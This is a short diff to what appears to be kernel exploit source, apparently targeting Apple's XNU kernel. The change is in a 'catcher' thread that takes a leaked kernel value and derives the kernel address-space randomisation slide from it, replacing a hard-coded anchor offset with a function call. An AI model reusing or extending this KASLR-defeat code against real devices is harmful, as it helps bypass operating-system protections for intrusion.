@@ -77,9 +77,10 @@ static void* catcher(void* arg)
         if (!kslide && req.code[0] == 1 && req.code[1] != 0xdeadbeef) {
             uint32_t val = req.code[1];
             LOG("Leaked value: 0x%x", val);
-            if ((val & 0xfffff) == (OFF_ANCHOR & 0xfffff)) // XXX 0xfffffff0070d4878
+            const uint32_t anchor = get_anchor();
+            if ((val & 0xfffff) == (anchor & 0xfffff)) // XXX 0xfffffff0070d4878
             {
-                kslide = val - OFF_ANCHOR;
+                kslide = val - anchor;
             }
         }
 
